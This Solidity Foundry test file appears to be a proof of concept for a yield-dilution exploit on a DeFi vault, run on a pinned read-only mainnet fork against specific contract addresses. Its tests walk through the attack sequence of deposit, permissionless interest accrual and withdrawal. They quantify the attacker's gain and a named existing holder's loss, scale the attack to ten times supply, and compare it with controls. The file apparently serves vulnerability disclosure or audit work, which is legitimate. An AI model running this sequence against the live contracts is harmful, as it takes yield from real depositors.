// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Base.t.sol";
import "../src/interfaces/IVaultA.sol";
import "../src/interfaces/IDebtA.sol";
import "../src/interfaces/ITokenA.sol";

/// Case A. Read-only fork pinned at a fixed block; nothing is broadcast.
contract CaseA is Base {
    IVaultA s = IVaultA(0xb4D498029af77680cD1eF828b967f010d06C51CC);
    IDebtA debt = IDebtA(0x2C5e9aFBb670c4A61aC2DcAD62C258eE2391389a);
    address constant TREASURY = 0x391EcC7ffEFc48cff41D0F2Bb36e38b82180B993;
    bytes4 constant DISTRIBUTE = 0xfbd45405; // treasury distribute() selector
    ITokenA tok = ITokenA(0xdD468A1DDc392dcdbEf6db6e34E89AA338F9F186);
    address attacker = address(0xA77AC);

    function _fund(uint256 D) internal { _fork(); deal(address(tok), attacker, D); vm.prank(attacker); tok.approve(address(s), type(uint256).max); }

    function _run(uint256 D, bool accrueBefore, bool accrueDuring) internal returns (int256 gain, uint256 pot, uint256 S0) {
        if (accrueBefore) debt.accrueInterest();
        pot = debt.getAccruedInterest(); S0 = s.totalSupply();
        uint256 b0 = tok.balanceOf(attacker);
        vm.startPrank(attacker);
        s.deposit(D);
        if (accrueDuring) debt.accrueInterest();   // permissionless accrual call after our deposit
        s.withdraw(D);
        vm.stopPrank();
        gain = int256(tok.balanceOf(attacker)) - int256(b0);
    }

    function test_attack_captures_preaccrued_interest() public {
        uint256 D = 1314741978542832145992110; // == share supply at pin
        _fund(D);
        (int256 gain, uint256 pot, uint256 S0) = _run(D, false, true);
        emit log_named_uint("interest accrued before deposit (wei)", pot);
        emit log_named_uint("share supply before (wei)", S0);
        emit log_named_int("attacker net gain (wei)", gain);
        // expected ~ D * (pot/2) / (S0 + D); small deviation allowed for the treasury residue
        uint256 expected = D * (pot / 2) / (S0 + D);
        emit log_named_uint("expected ~ D*(pot/2)/(S+D)", expected);
        assertGt(gain, 0, "captured yield accrued before deposit");
        assertApproxEqRel(uint256(gain), expected, 0.02e18, "gain ~ pro-rata share of pre-accrued interest");
    }

    /// Victim-side: an existing holder claims less yield when the sequence runs.
    function test_victim_loses_pro_rata() public {
        uint256 D = 1314741978542832145992110; _fund(D);
        address victim = 0x677817bF3e44b90E8F95222F75e2950b7904a401; // existing holder at the pinned block
        uint256 balV = s.balanceOf(victim); uint256 pot = debt.getAccruedInterest(); uint256 S0 = s.totalSupply();
        uint256 snap = vm.snapshotState();
        // branch 1: no attacker — accrue + distribute, victim claims
        debt.accrueInterest(); { (bool ok,) = TREASURY.call(abi.encodeWithSelector(DISTRIBUTE)); require(ok, "distribute"); }
        uint256 v0 = tok.balanceOf(victim); vm.prank(victim); s.claimYield(); uint256 claimNoAttack = tok.balanceOf(victim) - v0 + s.claimableYield(victim); // gauge claims are capped per call; count the remainder still credited
        vm.revertToState(snap);
        // branch 2: attack, then victim claims
        (int256 gain,,) = _run(D, false, true);
        v0 = tok.balanceOf(victim); vm.prank(victim); s.claimYield(); uint256 claimAttack = tok.balanceOf(victim) - v0 + s.claimableYield(victim);
        emit log_named_uint("victim claim without sequence (wei)", claimNoAttack);
        emit log_named_uint("victim claim with sequence (wei)", claimAttack);
        emit log_named_int("attacker gain (wei)", gain);
        assertGt(claimNoAttack, claimAttack, "existing holder yield reduced");
        // loss ~= balV*(pot/2)*(1/S - 1/(S+D)); 3% tolerance for the residue
        uint256 expectedLoss = balV * (pot/2) / S0 - balV * (pot/2) / (S0 + D);
        assertApproxEqRel(claimNoAttack - claimAttack, expectedLoss, 0.03e18, "loss ~ pro-rata dilution");
    }

    /// Scaling: D = 10x supply.
    function test_attack_scaling_10x_supply() public {
        uint256 D = 10 * 1314741978542832145992110; _fund(D);
        (int256 gain, uint256 pot, uint256 S0) = _run(D, false, true);
        emit log_named_int("attacker gain with D = 10*S (wei)", gain);
        assertApproxEqRel(uint256(gain), D * (pot / 2) / (S0 + D), 0.02e18);
    }

    function test_control_no_accrue_gives_nothing() public {
        uint256 D = 1314741978542832145992110; _fund(D);
        (int256 gain,,) = _run(D, false, false);
        emit log_named_int("control (no accrual) gain", gain);
        assertLt(gain, 2e18, "without the accrual call, gain is only the residue");
    }

    function test_control_accrue_before_deposit_gives_nothing() public {
        uint256 D = 1314741978542832145992110; _fund(D);
        (int256 gain,,) = _run(D, true, false);
        emit log_named_int("control (accrue before deposit) gain", gain);
        assertLt(gain, 2e18, "if accrual is minted before deposit, existing holders are protected");
    }
}
